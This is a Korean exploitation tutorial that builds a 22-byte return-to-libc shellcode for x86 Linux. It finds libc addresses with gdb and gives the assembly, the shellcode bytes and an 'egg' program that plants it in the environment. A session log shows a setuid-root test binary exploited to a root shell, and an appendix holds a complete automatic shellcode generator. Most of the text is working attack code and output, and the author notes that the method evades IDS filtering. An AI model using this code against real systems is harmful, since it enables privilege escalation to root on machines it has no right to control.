                                        Return-to-lib 기법을 이용한 쉘코드 생성

                                                              mutacker in Null@Root 
                                                              mutacker@null2root.org, dbyeom@mail.hangkong.ac.kr
                                                             (http://mutacker.null2root.org)

1. 소개
현재 알려진 대부분의 쉘코드는 시스템콜을 분석하여 제작되어지고 있으며, 시스템콜에 대해 능숙하지 않은 사람들의 경우 쉘코드를 뽑아낸다는 것은 그리 쉽지 않은 실정이다. 또한, 쉘코드의 길이가 상당히 길다는 단점을 갖고 있다.
현재 리눅스 용으로 소개되어 있는 가장 작은 쉘코드로는 약 27바이트 정도로 소개되어 있다. 버퍼의 크기가 이보다 작은 경우에는 응용을 할 수 없다.
이 글에서 소개하고자 하는 쉘코드는 x86 리눅스 시스템에서 약 22바이트 크기를 갖는다. 물론, 약간의 응용에 따라 그 길이는 약간 길어질수도 있다.
이 글에서 사용한 기술은 이미 많은 글에서 소개하고 있는 return-to-lib 기술을 이용한 것이다.

2. 쉘코드 생성

2.1 system()과 setuid()의 주소 알아내기
대부분의 시스템이 공유라이브러리의 경우 공격 대상 프로그램이나 공격용 프로그램이나 모두 system()과 setuid()의 주소가 동일하게 나타나므로 조그마한 프로그램을 하나 작성한 후 이들 주소를 획득할 수 있다.

[[mutacker@note myshell]$ cat sysset.c
main() {
        printf("wow");
}
[mutacker@note myshell]$ gcc -o sysset sysset.c
[mutacker@note myshell]$ gdb -q sysset
(gdb) b *(main+3)
Breakpoint 1 at 0x804845f
(gdb) r
Starting program: /home/mutacker/myshell/sysset

Breakpoint 1, 0x804845f in main ()
(gdb) print system
$1 = {<text variable, no debug info>} 0x4006b498 <__libc_system>
(gdb) print setuid
$2 = {<text variable, no debug info>} 0x400d0ae4 <__setuid>
(gdb) q
The program is running.  Exit anyway? (y or n) y

위에서 우리는 system()은 0x4006b498에, setuid()는 0x400d0ae4에 존재함을 알 수 있다.
이들 주소의 중간에 00이 나타나는 경우라 할지라도 걱정하지 말기 바란다.
만일 system()의 주소가 0x4006b400 이라면 0x4006b4FF와 같이 00 자리에 임의의 수를 채워넣고
shift 연산을 이용해서 원하는 값을 만들 수도 있기 때문이다.

2.2 "/bin/sh"의 주소 알아내기

system()함수는 내부적으로 어떤 명령을 실행시키기 위해 /bin/sh을 실행시키고 이를 통해
원하는 명령을 실행시키는 것에 착안하여 system()함수 코드 내부 어딘가에 /bin/sh 문자열이 
존재할 것임을 추측할 수 있다. 그 문자열의 위치값을 얻어서 그 주소를 직접 사용할 것이다.

[mutacker@note myshell]$ cat findsh.c
int main(int argc, char **argv)
{
        long shell;
        shell = 0x4006b498;  // <=== system()함수의 주소
        while(memcmp((void*)shell,"/bin/sh",8)) shell++;
        printf("\"/bin/sh\" is at 0x%x\n",shell);
        printf("print %s\n",shell);
}
[mutacker@note myshell]$ gcc -o findsh findsh.c
[mutacker@note myshell]$ ./findsh
"/bin/sh" is at 0x4012eca9
print /bin/sh

2.3 실제 적용하기

위에서 수집된 데이터를 사용하여 실제 쉘코드를 작성해 보자.
먼저 ret 코드에 대해 알아보자.

ret 명령은 현재 esp 레지스터가 가리키는 곳에서 값을 꺼내어 eip값으로 설정한다.

만일 esp가 가리키는 곳의 값이 0x4006b498 이라면 eip의 값을 0x4006b498으로 설정하게 된다는 것이다.
그렇다면 eip값에 따라 다음 명령이 수행이 되어질 것이다.
만일 esp가 가리키는 곳이 system() 함수의 주소라면 어떻게 될까?
그렇다!! system() 함수가 실행이 되어질 것이다.
그렇다면 call에 의해 호출되어지는 system()와 ret에 의해 호출되어지는 system()은 어떤 차이가 있을까?
차이는 크게 존재하지 않는다. 단지 리턴 어드레스를 스택에 넣고 가는가 아닌가의 차이밖에는 없다.
그렇다면 ret를 통해 호출됨으로써 리턴 어드레스가 스택에 없는 상황에서 system()함수 내부에서
ret명령이 수행이 되어지면 무슨 일이 발생할까?
계산해 보면 이전에 esp가 가리키던 곳 바로 아랫쪽임을 알 수 있다.

버퍼오버플로어나 포맷스트링 버그를 통해 어떤 프로그램의 리턴 어드레스 부분에 어떤 함수의 주소를
넣었을 경우 그 함수가 정상적으로 수행이 되어지고 나서 리턴 되어지는 시점에서 이전의 리턴 어드레스 
다음의 4바이트 공간을 다음 수행할 리턴어드레스로 생각한다는 것이다. 
그렇다면 우리는 다음과 같은 가정을 할 수가 있다.
리턴 어드레스 자리에 setuid()함수의 주소를 넣고, 다음 4바이트에 system()의 주소를 넣는다.
그러면 이 함수들이 차례대로 실행이 된다.
그렇다... 이 가정은 절대로 우리를 배신하지 않고 그대로 적용이 되어진다.
그렇다면 매개변수들은 어디에 넣을 것인가?
우리가 함수의 주소를 넣은 곳으로 부터 4바이트 떨어진 곳에서 그 매개변수를 찾는다는 것을 코드를 
분석해 보면 알 수 있다.
이를 토대로 해서 우리는 다음과 같은 스택의 모습을 꾸밀 수 있다.

<-- 하위주소                                                                 상위주소 -->
[setuid()의 주소] [system()의 주소] [setuid()를 위한 매개변수] [system()을 위한 매개변수 "/bin/sh"의 주소]
이때 esp레지스터는 setuid()의 주소가 저장된 곳을 가리키고 있다.

자!! 스택 프레임은 준비되었다. 이러한 상황에서 ret 명령이 발생하면 어떻게 될까?
그렇다.. setuid()가 실행되고, system("/bin/sh")이 실행되어지는 것을 경험할 수 있다. 

이제 쉘코드를 위한 코드를 작성해 보자.

[mutacker@note myshell]$ cat > makesh.c
int main() {
        __asm__("
                movl   $0x4012eca9, %eax            <=== address of "/bin/sh"
                push   %eax
                xor    %eax, %eax                   <=== 0 for setuid()
                push   %eax
                movl   $0x4006b498, %eax            <=== address of system() 
                push   %eax
                movl   $0x400d0ae4, %eax            <=== address of setuid()
                push   %eax
                ret
                ");
}

[mutacker@note myshell]$ gcc -o makesh makesh.c
[mutacker@note myshell]$ objdump -d makesh

mskesh:     file format elf32-i386
.....
0804842c <main>:
 804842c:       55                      push   %ebp
 804842d:       89 e5                   mov    %esp,%ebp
 804842f:       b8 a9 ec 12 40          mov    $0x4012eca9,%eax
 8048434:       50                      push   %eax
 8048435:       31 c0                   xor    %eax,%eax
 8048437:       50                      push   %eax
 8048438:       b8 98 b4 06 40          mov    $0x4006b498,%eax
 804843d:       50                      push   %eax
 804843e:       b8 e4 0a 0d 40          mov    $0x400d0ae4,%eax
 8048443:       50                      push   %eax
 8048444:       c3                      ret
 8048445:       5d                      pop    %ebp
 8048446:       c3                      ret
 8048447:       90                      nop
 8048448:       90                      nop
.....

3. 공격에 사용할 EGG 만들기

#include <stdio.h>

#define DEFAULT_OFFSET             0
#define DEFAULT_BUFFER_SIZE        1024
#define NOP                        0x43

char shellcode[] = "\xb8\xa9\xec\x12\x40\x50\x31\xc0\x50\xb8\x98\xb4\x06\x40\x50\xb8\xe4\x0a\x0d\x40\x50\xc3";

unsigned long get_sp(void)
{
	__asm__("movl %esp,%eax");
}

main() {
	char *buff, *ptr;
	long *addr_ptr, addr;
	int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
	int i;

	if (!(buff = malloc(bsize))) {
		printf("Can't allocate memory.\n");
		exit(0);
	}

	addr = get_sp() - offset;
	printf("Using address: 0x%x\n", addr);

	ptr = buff;
	addr_ptr = (long *) ptr;
	for (i = 0; i < bsize; i+=4)
		*(addr_ptr++) = addr;

	for (i = 0; i < bsize; i++)
		buff[i] = NOP;

	ptr = buff + (bsize - strlen(shellcode) - 1);
	for (i = 0; i < strlen(shellcode); i++)
		*(ptr++) = shellcode[i];

	buff[bsize - 1] = '\0';

	memcpy(buff,"EGG=",4);
	putenv(buff);
	system("/bin/bash");
}

4. 취약 프로그램을 통한 테스트

[mutacker@note myshell]$ cat vul.c
void a(char *ptr) {
        char buf[20];

        strncpy(buf, ptr);
        printf("%s\n", buf);
}

main(int argc, char* argv[]) {
        a(argv[1]);
        return 1;
}

[mutacker@note myshell]$ gcc -o vul vul.c

[mutacker@note myshell]$ ./vul `perl -e 'print "A"x39'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[mutacker@note myshell]$ ./vul `perl -e 'print "A"x40'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmention fault (core dumped)

[mutacker@note myshell]$ ./egg
Using address: 0xbffffc18

[mutacker@note myshell]$ ls -al /home/contest/vul
-rwsr-xr-x    1 root     root        13571  4월 11 03:06 /home/contest/vul

[mutacker@note myshell]$ /home/contest/vul `perl -e 'print "A"x40, "\x18\xfc\xff\xbf"x2'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?웠sh-2.04# id
uid=0(root) gid=500(mutacker) groups=500(mutacker)

4. 단점과 장점

이 쉘코드의 경우 쉘코드를 적용시키기 위해 매번 setuid(), system(), "/bin/sh"의 주소를 찾아야 
하는 수고를 거쳐야 한다. (물론 dlopen(), dlsym() 등을 이용해 쉽게 찾는 방법도 많다.)
즉, 너무 공격용 시스템에 의존한다는 단점을 갖는다.
하지만, IDS와 같은 필터링에 유동성있게 반응할 수 있으며, 버퍼가 아주 작은 경우에 적용이 가능하다는
장점을 가지고 있다. 또한, 각 시스템에서 사용하는 시스템콜의 분석을 줄일수 있다는 장점도 같이 갖는다.

5. 결론

우리는 기존의 시스템콜을 분석 코드를 추출하여 만들던 쉘코드와는 다른 새로운 형태의 쉘코드를 만들어 보았다.
또한, 그 크기도 상당히 줄일 수 있다는 것을 확인하였다.
테스트를 해보지는 못했지만, 다양한 종류의 시스템에서 그대로 적용이 가능하리라 본다.

6. 참고 문서
- Omega project finished. (http://community.core-sdi.com/~juliano/lmagra-omega.txt 원 사이트가 현재 닫혀져 있음) 
- Advanced return-into-lib(c) exploits (PaX case study) (http://www.phrack.org/phrack/58/p58-0x04)


7. Appendix 
자동화 생성툴( Coded by Saintlinu in Null@Root, 감사^^ )

#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

#define	DIFF		0x4000
#define LIBC		"/lib/i686/libc.so.6"
#define SCSOURCE	"shellcode.c"
#define SCBINARY	"shellcode"
#define SCDUMP		"shellcodedump.txt"
#define BACKUP 		"backup.txt"
#define OBJDUMP		"/usr/bin/objdump"
#define GCC		"/usr/bin/gcc"
#define CAT		"/bin/cat"
#define GREP 		"/bin/grep"
#define AWK 		"/bin/awk"
#define CUT 		"/bin/cut"
#define PERL 		"/usr/bin/perl"
#define PERLFILE 	"extract"
#define CHMOD		"/bin/chmod"
#define RM		"/bin/rm"

int main(int argc, char **argv)
{
	FILE *fp;
	long shellStringAddress;
	char CMD[256], buffer[256], shellcodeBuffer[256];
	long systemVar, setuidVar, setreuidVar;
	void *handle;
	int i, reuidVar;

	if(argc < 2) {
		puts("\nThis program is shellcode generator on the LINUX on x86");
		puts("                                     Made by Saintlinu");
		puts("\nWARNING : USE AT YOUR OWN RISK!!!\n");
		printf("Usage : %s uid\n\n", argv[0]);
		exit(-1);
	}

	handle=dlopen(LIBC, RTLD_LAZY);
	setuidVar=(long)dlsym(handle,"setuid");
	dlclose(handle);
	
	handle=dlopen(LIBC, RTLD_LAZY);
	systemVar=(long)dlsym(handle,"system");
	dlclose(handle);

	handle=dlopen(LIBC, RTLD_LAZY);
	setreuidVar=(long)dlsym(handle,"setreuid");
	dlclose(handle);

	reuidVar=atoi(argv[1]);
	setuidVar -= DIFF;
	setreuidVar -= DIFF;
	systemVar -= DIFF;

	/* To open file descriptor */
	if((fp=fopen(SCSOURCE, "w")) < 0) {
		printf("File open error\n");
		exit(-1);
	}

	/* find strings /bin/sh in system() */
	shellStringAddress=systemVar;
	while((memcmp((void *)shellStringAddress, "/bin/sh", 8)))
		shellStringAddress++;	// if not equal then result is larger than 1
	
	shellStringAddress -= DIFF;

	/* To print about something */
	puts("\nThis program is shellcode generator on the LINUX on x86");
	puts("                                     Made by Saintlinu");
	puts("\nWARNING : USE AT YOUR OWN RISK!!!\n");
	puts("\n=================================================");
	puts("Calculating.....\n");
	printf("setuid() address is 0x%x\n", setuidVar);
	printf("setreuid() address is 0x%x\n", setreuidVar);
	printf("system() address is 0x%x\n", systemVar);
	printf("\n\"/bin/sh\" strings address is 0x%x\n", shellStringAddress);
	puts("=================================================\n");
	puts("Let's make a shellcode's binary ....\n");

	/* To write shellcode in assembly language to shellcode.c */
	if(reuidVar == 0) {
		fprintf(fp, "int main(int argc, char **argv)\n");
		fprintf(fp, "{\n");
		fprintf(fp, "	__asm__  (\"\n");
		fprintf(fp, "			 movl $0x%x, %s\n", shellStringAddress, "%eax");
		fprintf(fp, "			 push %s\n", "%eax");
		fprintf(fp, "			 xor %s, %s\n", "%eax", "%eax");
		fprintf(fp, "			 push %s\n", "%eax");
		fprintf(fp, "		         movl $0x%x, %s\n", systemVar, "%eax");
		fprintf(fp, "			 push %s\n", "%eax");
		fprintf(fp, "			 movl $0x%x, %s\n", setuidVar, "%eax");
		fprintf(fp, "			 push %s\n", "%eax");
		fprintf(fp, "		         ret\n");
		fprintf(fp, "		\");\n");
		fprintf(fp, "}\n");
		fclose(fp);
	} else {
		fprintf(fp, "int main(int argc, char **argv)\n");
		fprintf(fp, "{\n");
		fprintf(fp, "	__asm__ (\"\n");
	 	fprintf(fp, "			movw $0x%x, %s\n", reuidVar, "%ax");
	 	fprintf(fp, "			movw %s, %s\n", "%ax", "%bx");
	 	fprintf(fp, "			push %s\n", "%ax");
	 	fprintf(fp, "			push %s\n", "%bx");
	 	fprintf(fp, "			push $0x18\n");
	 	fprintf(fp, "			int  $0x80\n");
		fprintf(fp, "			movl $0x%x, %s\n", shellStringAddress, "%eax");
		fprintf(fp, "			push %s\n", "%eax");
		fprintf(fp, "			xor %s, %s\n", "%eax", "%eax");
		fprintf(fp, "			push %s\n", "%eax");
		fprintf(fp, "			movl $0x%x, %s\n", systemVar, "%eax");
		fprintf(fp, "			push %s\n", "%eax");
		fprintf(fp, "			movl $0x%x, %s\n", setuidVar, "%eax");
		fprintf(fp, "			push %s\n", "%eax");
		fprintf(fp, "			ret\n");
		fprintf(fp, "		\");\n");
		fprintf(fp, "}\n");
		fclose(fp);
	}

	/* To make executive shellcode's object file using a "gcc" */
	sprintf(CMD, "%s -o %s %s\n", GCC, SCBINARY, SCSOURCE);
        system(CMD);

	/* To make binary code with objdump */
	sprintf(CMD, "%s -d %s > %s\n", OBJDUMP, SCBINARY, SCDUMP);
	system(CMD);

	/* To trim shellcode's dumpfile */
	if(reuidVar == 0) {
		sprintf(CMD, "%s %s | %s -A 11 \"<main>\" > %s\n", CAT, SCDUMP, GREP, BACKUP);
		system(CMD);
	} else if(reuidVar != 0) {
		sprintf(CMD, "%s %s | %s -A 17 \"<main>\" > %s\n", CAT, SCDUMP, GREP, BACKUP);
		system(CMD);
	}
		

	/* To trim space from dumpfile and stuff */ 
	sprintf(CMD, "%s %s | %s -d: -f2 | %s -d\" \" -f1-5 | %s \'{ print $1 $2 $3 $4 $5 }\' > %s\n", CAT, BACKUP, CUT, CUT, AWK, SCDUMP);
	system(CMD);

	/* To make a PERL file */
	if((fp=fopen(PERLFILE, "w")) < 0) {
		printf("file write error\n");
		exit(-1);
	}
    	fprintf(fp, "#!%s -w\n open(SCFILE, '%s') || die $!;while(<SCFILE>) { chop($_); $shellcode .= $_; } print $shellcode;\n", PERL, SCDUMP);
	fclose(fp);
	sprintf(CMD, "%s +x %s\n", CHMOD, PERLFILE);
	system(CMD);
	sprintf(CMD, "./%s > %s\n", PERLFILE, BACKUP);
	system(CMD);

	/* To modify final stuff */
	if((fp=fopen(BACKUP, "r")) < 0) {
		printf("file write error\n");
		exit(-1);
	}
	
	bzero(buffer, sizeof(buffer), 0);
	for(i=0; i<sizeof(buffer); i+=4) {
		buffer[i]='\\';
		buffer[i+1]='x';
		buffer[i+2]=fgetc(fp);
		buffer[i+3]=fgetc(fp);
		if(!(isalnum(buffer[i+2])) && buffer[i+1] == 'x' && buffer[i] == '\\') {
			buffer[i]='\0';
			break;
		}
	}
	fclose(fp);

    	/* To delete stuff files */
	sprintf(CMD, "%s -rf %s %s %s %s %s\n", RM, BACKUP, PERLFILE, SCSOURCE, SCBINARY, SCDUMP);
	system(CMD);


	/* To make shellcode file */
	if((fp=fopen(SCBINARY, "w")) < 0) {
		printf("file write error\n");
		exit(-1);
	}
	fprintf(fp, "%s\n", buffer);
	fclose(fp);
	
	puts("\nOkay Done..................\n");
	exit(0);
}


